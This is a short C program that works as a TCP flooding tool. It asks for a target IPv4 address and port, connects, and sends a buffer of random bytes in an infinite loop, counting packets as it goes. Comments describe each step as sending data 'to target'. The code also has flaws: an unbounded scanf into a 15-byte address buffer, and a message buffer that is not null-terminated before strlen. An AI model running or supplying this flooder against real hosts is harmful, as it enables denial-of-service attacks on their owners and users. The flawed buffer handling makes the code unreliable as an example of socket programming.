#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
int main() {
  int sock = 0;
  struct sockaddr_in serv_addr; // declaring struct and creating serv_add variable

  char message[1024] = "";
  int lower = 32,
  upper = 132;
  for (int i = 0; i < 1024; i++) {
    int num = (rand() %(upper - lower + 1)) + lower;
    message[i] = num;
  }
  char *packet = message; // packet is pointer means it stores add of variable message

  char ip[15] = "";
  printf("IPv4: ");
  scanf("%s", ip);
  int PORT;
  printf("PORT: ");
  scanf("%d", &PORT);
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    printf("\n Socket creation error \n");
    return -1;
  }// creating socket of family AF_INET (ipv4 family)and capable of SOCK_STREAM (tcp data flow)

  serv_addr.sin_family = AF_INET; // setting sin_family to AF_INET
  serv_addr.sin_port = htons(PORT);// setting sin_port to PORT that is given by user

  // Convert IPv4 and IPv6 addresses from text to binary form
  if(inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
    printf("\nInvalid address/ Address not supported \n");
    return -1;
  }

  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    printf("\nConnection Failed \n");
    return -1;
  } // it connects socket you have created to ip and port and then capable of sending nd recieving

  int long count = 1;
  while(1) {
    send(sock, packet, strlen(packet), 0); // send data to target through socket 
    printf("Sending packet %ld...\n", count++);
  }
  return 0;
}